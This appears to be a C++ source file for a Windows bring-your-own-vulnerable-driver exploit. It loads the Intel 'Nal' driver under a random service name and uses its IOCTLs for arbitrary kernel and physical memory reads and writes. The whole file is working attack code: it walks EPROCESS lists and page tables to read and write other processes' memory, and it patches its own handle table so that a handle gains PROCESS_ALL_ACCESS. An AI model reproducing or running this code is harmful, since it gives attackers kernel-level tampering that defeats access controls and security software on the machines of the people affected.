#include "intel_driver.h"
#include <cstdio>
#include <random>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef LONG NTSTATUS;
#define NTAPI __stdcall

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS(NTAPI* fn_NtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS(NTAPI* fn_NtUnloadDriver)(PUNICODE_STRING);
typedef void(NTAPI* fn_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

static fn_NtLoadDriver pNtLoadDriver;
static fn_NtUnloadDriver pNtUnloadDriver;
static fn_RtlInitUnicodeString pRtlInitUnicodeString;
static fn_NtQuerySystemInformation pNtQuerySystemInformation;

static HANDLE g_device = INVALID_HANDLE_VALUE;
static std::wstring g_service_name;
static std::wstring g_registry_path;

static bool resolve_ntdll() {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!nt) return false;
    pNtLoadDriver = (fn_NtLoadDriver)GetProcAddress(nt, "NtLoadDriver");
    pNtUnloadDriver = (fn_NtUnloadDriver)GetProcAddress(nt, "NtUnloadDriver");
    pRtlInitUnicodeString = (fn_RtlInitUnicodeString)GetProcAddress(nt, "RtlInitUnicodeString");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(nt, "NtQuerySystemInformation");
    return pNtLoadDriver && pNtUnloadDriver && pRtlInitUnicodeString && pNtQuerySystemInformation;
}

static std::wstring random_service_name() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 35);
    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::wstring name(12, L'\0');
    for (auto& c : name) c = charset[dist(gen)];
    return name;
}

static bool create_service_registry(const std::wstring& svc_name, const std::wstring& driver_path) {
    std::wstring key_path = L"SYSTEM\\CurrentControlSet\\Services\\" + svc_name;
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path.c_str(), 0, nullptr,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hKey, nullptr) != ERROR_SUCCESS)
        return false;
    std::wstring image_path = L"\\??\\" + driver_path;
    DWORD type = 1, start = 3, error_ctrl = 0;
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, (BYTE*)image_path.c_str(), (DWORD)(image_path.size() + 1) * 2);
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&error_ctrl, sizeof(error_ctrl));
    RegCloseKey(hKey);
    return true;
}

static void delete_service_registry(const std::wstring& svc_name) {
    std::wstring key_path = L"SYSTEM\\CurrentControlSet\\Services\\" + svc_name;
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, key_path.c_str());
}

static bool enable_privilege(const wchar_t* priv_name) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    TOKEN_PRIVILEGES tp = {};
    if (!LookupPrivilegeValueW(nullptr, priv_name, &tp.Privileges[0].Luid)) {
        CloseHandle(token);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(token);
    return ok && GetLastError() == ERROR_SUCCESS;
}

namespace intel {

bool LoadDriver(const std::wstring& driver_path) {
    if (!resolve_ntdll()) {
        printf("[-] Failed to resolve ntdll functions\n");
        return false;
    }

    if (!enable_privilege(L"SeLoadDriverPrivilege")) {
        printf("[!] Warning: could not enable SeLoadDriverPrivilege\n");
    }

    g_device = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE,
                           0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_device != INVALID_HANDLE_VALUE) {
        printf("[+] Driver already loaded (reusing existing device)\n");
        return true;
    }

    g_service_name = random_service_name();
    g_registry_path = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + g_service_name;

    if (!create_service_registry(g_service_name, driver_path)) {
        printf("[-] Failed to create service registry\n");
        return false;
    }

    UNICODE_STRING us;
    pRtlInitUnicodeString(&us, g_registry_path.c_str());
    NTSTATUS status = pNtLoadDriver(&us);
    if (status != 0) {
        printf("[-] NtLoadDriver failed: 0x%08lX\n", status);
        delete_service_registry(g_service_name);
        return false;
    }

    g_device = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE,
                           0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_device == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open \\\\.\\Nal device (error %lu)\n", GetLastError());
        pNtUnloadDriver(&us);
        delete_service_registry(g_service_name);
        return false;
    }

    return true;
}

void UnloadDriver() {
    if (g_device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_device);
        g_device = INVALID_HANDLE_VALUE;
    }
    if (!g_registry_path.empty()) {
        UNICODE_STRING us;
        pRtlInitUnicodeString(&us, g_registry_path.c_str());
        pNtUnloadDriver(&us);
    }
    if (!g_service_name.empty()) {
        delete_service_registry(g_service_name);
    }
}

HANDLE GetDeviceHandle() { return g_device; }

// ──────────────────────────────────────────────────────────────
// Low-level IOCTL wrappers
// ──────────────────────────────────────────────────────────────

uint64_t MapIoSpace(uint64_t phys_addr, uint32_t size) {
    MAP_IO_SPACE_BUFFER_INFO buf = {};
    buf.case_number = 0x19;
    buf.physical_address_to_map = phys_addr;
    buf.size = size;

    DWORD bytes_returned = 0;
    if (!DeviceIoControl(g_device, IOCTL1, &buf, sizeof(buf),
                         &buf, sizeof(buf), &bytes_returned, nullptr))
        return 0;

    return buf.return_virtual_address;
}

bool UnmapIoSpace(uint64_t mapped_addr, uint32_t size) {
    UNMAP_IO_SPACE_BUFFER_INFO buf = {};
    buf.case_number = 0x1A;
    buf.virt_address = mapped_addr;
    buf.number_of_bytes = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(g_device, IOCTL1, &buf, sizeof(buf),
                           &buf, sizeof(buf), &bytes_returned, nullptr);
}

bool DriverCopy(uint64_t dest, uint64_t src, uint64_t size) {
    COPY_MEMORY_BUFFER_INFO buf = {};
    buf.case_number = 0x33;
    buf.source = src;
    buf.destination = dest;
    buf.length = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(g_device, IOCTL1, &buf, sizeof(buf),
                           nullptr, 0, &bytes_returned, nullptr);
}

// ──────────────────────────────────────────────────────────────
// Kernel virtual memory R/W — direct DriverCopy, no MapIoSpace
// The IOCTL runs in kernel mode so it can access kernel VAs
// ──────────────────────────────────────────────────────────────

bool ReadKernelMemory(uint64_t kernel_va, void* buffer, uint64_t size) {
    return DriverCopy((uint64_t)buffer, kernel_va, size);
}

bool WriteKernelMemory(uint64_t kernel_va, const void* buffer, uint64_t size) {
    return DriverCopy(kernel_va, (uint64_t)buffer, size);
}

// ──────────────────────────────────────────────────────────────
// Physical memory R/W — MapIoSpace + DriverCopy
// Only used for cross-process page table walks
// ──────────────────────────────────────────────────────────────

bool ReadPhysicalMemory(uint64_t phys_addr, void* buffer, uint32_t size) {
    if (!phys_addr || !buffer || !size) return false;

    uint64_t mapped = MapIoSpace(phys_addr, size);
    if (!mapped) return false;

    bool ok = DriverCopy((uint64_t)buffer, mapped, size);
    UnmapIoSpace(mapped, size);
    return ok;
}

bool WritePhysicalMemory(uint64_t phys_addr, const void* buffer, uint32_t size) {
    if (!phys_addr || !buffer || !size) return false;

    uint64_t mapped = MapIoSpace(phys_addr, size);
    if (!mapped) return false;

    bool ok = DriverCopy(mapped, (uint64_t)buffer, size);
    UnmapIoSpace(mapped, size);
    return ok;
}

// ──────────────────────────────────────────────────────────────
// Kernel helpers
// ──────────────────────────────────────────────────────────────

uint64_t FindKernelBase() {
    ULONG size = 0;
    pNtQuerySystemInformation(11, nullptr, 0, &size);
    if (!size) return 0;

    auto* modules = (RTL_PROCESS_MODULES*)malloc(size);
    if (!modules) return 0;

    if (pNtQuerySystemInformation(11, modules, size, &size) != 0) {
        free(modules);
        return 0;
    }

    uint64_t base = (uint64_t)modules->Modules[0].ImageBase;
    free(modules);
    return base;
}

// Resolve kernel export by reading kernel PE directly via DriverCopy
uint64_t ResolveKernelExport(uint64_t kernel_base, const char* func_name) {
    IMAGE_DOS_HEADER dos = {};
    if (!ReadKernelMemory(kernel_base, &dos, sizeof(dos)))
        return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt = {};
    if (!ReadKernelMemory(kernel_base + dos.e_lfanew, &nt, sizeof(nt)))
        return 0;

    auto& exp_dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir.VirtualAddress || !exp_dir.Size) return 0;

    IMAGE_EXPORT_DIRECTORY exports = {};
    if (!ReadKernelMemory(kernel_base + exp_dir.VirtualAddress, &exports, sizeof(exports)))
        return 0;

    uint64_t names_addr = kernel_base + exports.AddressOfNames;
    uint64_t funcs_addr = kernel_base + exports.AddressOfFunctions;
    uint64_t ords_addr  = kernel_base + exports.AddressOfNameOrdinals;

    for (DWORD i = 0; i < exports.NumberOfNames; i++) {
        DWORD name_rva = 0;
        if (!ReadKernelMemory(names_addr + i * 4, &name_rva, 4))
            continue;

        char name[256] = {};
        if (!ReadKernelMemory(kernel_base + name_rva, name, sizeof(name) - 1))
            continue;

        if (strcmp(name, func_name) == 0) {
            USHORT ordinal = 0;
            ReadKernelMemory(ords_addr + i * 2, &ordinal, 2);
            DWORD func_rva = 0;
            ReadKernelMemory(funcs_addr + ordinal * 4, &func_rva, 4);
            return kernel_base + func_rva;
        }
    }
    return 0;
}

// ──────────────────────────────────────────────────────────────
// Process DTB — walks EPROCESS via direct kernel reads
// No CR3 scan, no physical brute force
// ──────────────────────────────────────────────────────────────

static uint64_t g_off_pid = 0;
static uint64_t g_off_links = 0;
static constexpr uint64_t OFF_DTB = 0x28;

static bool discover_eprocess_offsets(uint64_t system_eprocess) {
    uint8_t buf[0x700] = {};
    if (!ReadKernelMemory(system_eprocess, buf, sizeof(buf))) {
        printf("[-] Failed to read EPROCESS for offset discovery\n");
        return false;
    }

    for (uint64_t off = 0x80; off < 0x600; off += 8) {
        uint64_t val = *(uint64_t*)(buf + off);
        if (val != 4) continue;

        uint64_t flink = *(uint64_t*)(buf + off + 8);

        if ((flink >> 48) != 0xFFFF) continue;
        if (flink == 0) continue;

        uint64_t blink = *(uint64_t*)(buf + off + 16);
        if ((blink >> 48) != 0xFFFF) continue;

        g_off_pid = off;
        g_off_links = off + 8;
        printf("[+] EPROCESS offsets auto-detected: PID=0x%llX, Links=0x%llX\n",
               g_off_pid, g_off_links);
        return true;
    }

    printf("[-] Could not auto-detect EPROCESS offsets\n");
    printf("[DBG] Dumping EPROCESS fields around expected range:\n");
    for (uint64_t off = 0x400; off < 0x500; off += 8) {
        uint64_t val = *(uint64_t*)(buf + off);
        printf("  +0x%03llX: 0x%016llX", off, val);
        if (val >= 1 && val <= 0xFFFF) printf(" (could be PID %llu)", val);
        if ((val >> 48) == 0xFFFF) printf(" (kernel ptr)");
        printf("\n");
    }
    return false;
}

uint64_t GetProcessDTB(uint64_t kernel_base, DWORD pid) {
    printf("[DBG] Resolving PsInitialSystemProcess...\n");
    uint64_t ps_initial = ResolveKernelExport(kernel_base, "PsInitialSystemProcess");
    if (!ps_initial) { printf("[-] PsInitialSystemProcess not found\n"); return 0; }
    printf("[+] PsInitialSystemProcess at 0x%llX\n", ps_initial);

    uint64_t system_eprocess = 0;
    if (!ReadKernelMemory(ps_initial, &system_eprocess, 8) || !system_eprocess)
        { printf("[-] Failed to read system EPROCESS ptr\n"); return 0; }
    printf("[+] System EPROCESS: 0x%llX\n", system_eprocess);

    if (!g_off_pid && !discover_eprocess_offsets(system_eprocess))
        return 0;

    uint64_t current = system_eprocess;

    for (int i = 0; i < 1000; i++) {
        uint64_t proc_pid = 0;
        ReadKernelMemory(current + g_off_pid, &proc_pid, 8);

        if (i < 5 || (DWORD)proc_pid == pid)
            printf("[DBG] EPROCESS 0x%llX -> PID %llu\n", current, proc_pid);

        if ((DWORD)proc_pid == pid) {
            uint64_t proc_dtb = 0;
            ReadKernelMemory(current + OFF_DTB, &proc_dtb, 8);
            printf("[+] Target DTB: 0x%llX\n", proc_dtb);
            return proc_dtb;
        }

        uint64_t flink = 0;
        ReadKernelMemory(current + g_off_links, &flink, 8);
        if (!flink) { printf("[DBG] Null flink at iteration %d\n", i); break; }

        current = flink - g_off_links;
        if (current == system_eprocess) { printf("[DBG] Wrapped around after %d processes\n", i+1); break; }
    }

    printf("[-] PID %lu not found in process list\n", pid);
    return 0;
}

// ──────────────────────────────────────────────────────────────
// Cross-process virtual memory via page table walk
// Uses ReadPhysicalMemory for page table entries only
// ──────────────────────────────────────────────────────────────

uint64_t TranslateVirtualToPhysical(uint64_t dtb, uint64_t virt_addr) {
    uint64_t pml4_idx = (virt_addr >> 39) & 0x1FF;
    uint64_t pdpt_idx = (virt_addr >> 30) & 0x1FF;
    uint64_t pd_idx   = (virt_addr >> 21) & 0x1FF;
    uint64_t pt_idx   = (virt_addr >> 12) & 0x1FF;

    uint64_t pml4e = 0;
    if (!ReadPhysicalMemory((dtb & ~0xFFF) + pml4_idx * 8, &pml4e, 8) || !(pml4e & 1))
        return 0;

    uint64_t pdpte = 0;
    if (!ReadPhysicalMemory((pml4e & 0x000FFFFFFFFFF000) + pdpt_idx * 8, &pdpte, 8) || !(pdpte & 1))
        return 0;

    if (pdpte & 0x80)
        return (pdpte & 0x000FFFFFC0000000) + (virt_addr & 0x3FFFFFFF);

    uint64_t pde = 0;
    if (!ReadPhysicalMemory((pdpte & 0x000FFFFFFFFFF000) + pd_idx * 8, &pde, 8) || !(pde & 1))
        return 0;

    if (pde & 0x80)
        return (pde & 0x000FFFFFFFE00000) + (virt_addr & 0x1FFFFF);

    uint64_t pte = 0;
    if (!ReadPhysicalMemory((pde & 0x000FFFFFFFFFF000) + pt_idx * 8, &pte, 8) || !(pte & 1))
        return 0;

    return (pte & 0x000FFFFFFFFFF000) + (virt_addr & 0xFFF);
}

bool ReadVirtualMemory(uint64_t dtb, uint64_t virt_addr, void* buffer, uint64_t size) {
    uint8_t* dst = (uint8_t*)buffer;
    uint64_t remaining = size;
    uint64_t offset = 0;

    while (remaining > 0) {
        uint64_t phys = TranslateVirtualToPhysical(dtb, virt_addr + offset);
        if (!phys) return false;

        uint64_t page_remaining = 0x1000 - ((virt_addr + offset) & 0xFFF);
        uint64_t chunk = (remaining < page_remaining) ? remaining : page_remaining;
        if (chunk > 0x1000) chunk = 0x1000;

        if (!ReadPhysicalMemory(phys, dst + offset, (uint32_t)chunk))
            return false;

        offset += chunk;
        remaining -= chunk;
    }
    return true;
}

bool WriteVirtualMemory(uint64_t dtb, uint64_t virt_addr, const void* buffer, uint64_t size) {
    const uint8_t* src = (const uint8_t*)buffer;
    uint64_t remaining = size;
    uint64_t offset = 0;

    while (remaining > 0) {
        uint64_t phys = TranslateVirtualToPhysical(dtb, virt_addr + offset);
        if (!phys) return false;

        uint64_t page_remaining = 0x1000 - ((virt_addr + offset) & 0xFFF);
        uint64_t chunk = (remaining < page_remaining) ? remaining : page_remaining;
        if (chunk > 0x1000) chunk = 0x1000;

        if (!WritePhysicalMemory(phys, src + offset, (uint32_t)chunk))
            return false;

        offset += chunk;
        remaining -= chunk;
    }
    return true;
}

// ──────────────────────────────────────────────────────────────
// Find EPROCESS for a given PID
// ──────────────────────────────────────────────────────────────

uint64_t FindEPROCESS(uint64_t kernel_base, DWORD pid) {
    uint64_t ps_initial = ResolveKernelExport(kernel_base, "PsInitialSystemProcess");
    if (!ps_initial) return 0;

    uint64_t system_eprocess = 0;
    if (!ReadKernelMemory(ps_initial, &system_eprocess, 8) || !system_eprocess)
        return 0;

    if (!g_off_pid && !discover_eprocess_offsets(system_eprocess))
        return 0;

    uint64_t current = system_eprocess;
    for (int i = 0; i < 1000; i++) {
        uint64_t proc_pid = 0;
        ReadKernelMemory(current + g_off_pid, &proc_pid, 8);
        if ((DWORD)proc_pid == pid) return current;

        uint64_t flink = 0;
        ReadKernelMemory(current + g_off_links, &flink, 8);
        if (!flink) break;
        current = flink - g_off_links;
        if (current == system_eprocess) break;
    }
    return 0;
}

// ──────────────────────────────────────────────────────────────
// Patch handle GrantedAccessBits to PROCESS_ALL_ACCESS
// Finds ObjectTable in our EPROCESS, walks handle table entries
// ──────────────────────────────────────────────────────────────

bool GrantHandleAccess(uint64_t kernel_base, HANDLE handle) {
    DWORD our_pid = GetCurrentProcessId();
    uint64_t our_eprocess = FindEPROCESS(kernel_base, our_pid);
    if (!our_eprocess) {
        printf("[-] Could not find our EPROCESS (PID %lu)\n", our_pid);
        return false;
    }
    printf("[DBG] Our EPROCESS: 0x%llX (PID %lu)\n", our_eprocess, our_pid);

    // Scan EPROCESS for ObjectTable: a kernel pointer where
    // the pointed-to structure has QuotaProcess == our_eprocess
    uint8_t eproc_buf[0x800] = {};
    if (!ReadKernelMemory(our_eprocess, eproc_buf, sizeof(eproc_buf))) {
        printf("[-] Failed to read our EPROCESS\n");
        return false;
    }

    uint64_t object_table = 0;
    uint64_t table_code = 0;

    for (uint64_t off = 0x80; off < 0x700; off += 8) {
        uint64_t candidate = *(uint64_t*)(eproc_buf + off);
        if ((candidate >> 48) != 0xFFFF) continue;
        if (candidate == our_eprocess) continue;

        // Read potential _HANDLE_TABLE and check QuotaProcess
        // _HANDLE_TABLE layout (approx):
        //   +0x000 NextHandleNeedingPool
        //   +0x008 TableCode
        //   +0x010 QuotaProcess
        uint8_t ht_buf[0x20] = {};
        if (!ReadKernelMemory(candidate, ht_buf, sizeof(ht_buf)))
            continue;

        uint64_t tc = *(uint64_t*)(ht_buf + 0x008);
        uint64_t qp = *(uint64_t*)(ht_buf + 0x010);

        if (qp == our_eprocess && (tc >> 48) == 0xFFFF) {
            object_table = candidate;
            table_code = tc;
            printf("[+] ObjectTable at EPROCESS+0x%llX = 0x%llX\n", off, candidate);
            printf("[DBG] TableCode: 0x%llX, QuotaProcess: 0x%llX\n", tc, qp);
            break;
        }
    }

    if (!object_table) {
        printf("[-] Could not find ObjectTable in EPROCESS\n");
        return false;
    }

    // Walk handle table to find our handle entry
    uint64_t handle_value = (uint64_t)(uintptr_t)handle;
    uint64_t entry_index = handle_value / 4;
    uint64_t level = table_code & 3;
    uint64_t base = table_code & ~3ULL;

    uint64_t entry_addr = 0;

    if (level == 0) {
        entry_addr = base + entry_index * 16;
    } else if (level == 1) {
        uint64_t page_index = entry_index / 256;
        uint64_t page_offset = (entry_index % 256) * 16;
        uint64_t page_ptr = 0;
        if (!ReadKernelMemory(base + page_index * 8, &page_ptr, 8) || !page_ptr) {
            printf("[-] Failed to read handle table page pointer\n");
            return false;
        }
        entry_addr = page_ptr + page_offset;
    } else if (level == 2) {
        uint64_t dir_index = entry_index / (256 * 256);
        uint64_t remaining = entry_index % (256 * 256);
        uint64_t page_index = remaining / 256;
        uint64_t page_offset = (remaining % 256) * 16;
        uint64_t mid_ptr = 0;
        if (!ReadKernelMemory(base + dir_index * 8, &mid_ptr, 8) || !mid_ptr)
            return false;
        uint64_t page_ptr = 0;
        if (!ReadKernelMemory(mid_ptr + page_index * 8, &page_ptr, 8) || !page_ptr)
            return false;
        entry_addr = page_ptr + page_offset;
    }

    if (!entry_addr) {
        printf("[-] Could not compute handle table entry address\n");
        return false;
    }

    printf("[DBG] Handle 0x%llX -> entry at 0x%llX (level %llu)\n",
           handle_value, entry_addr, level);

    // Read current GrantedAccessBits (at entry + 0x08, low 25 bits)
    uint32_t current_access = 0;
    if (!ReadKernelMemory(entry_addr + 0x08, &current_access, 4)) {
        printf("[-] Failed to read handle entry access bits\n");
        return false;
    }
    printf("[DBG] Current GrantedAccess: 0x%08X\n", current_access & 0x01FFFFFF);

    // Write PROCESS_ALL_ACCESS (0x001FFFFF) preserving upper bits
    uint32_t new_access = (current_access & 0xFE000000) | 0x001FFFFF;
    if (!WriteKernelMemory(entry_addr + 0x08, &new_access, 4)) {
        printf("[-] Failed to write handle entry access bits\n");
        return false;
    }

    // Verify
    uint32_t verify = 0;
    ReadKernelMemory(entry_addr + 0x08, &verify, 4);
    printf("[+] GrantedAccess patched: 0x%08X -> 0x%08X\n",
           current_access & 0x01FFFFFF, verify & 0x01FFFFFF);

    return true;
}

} // namespace intel
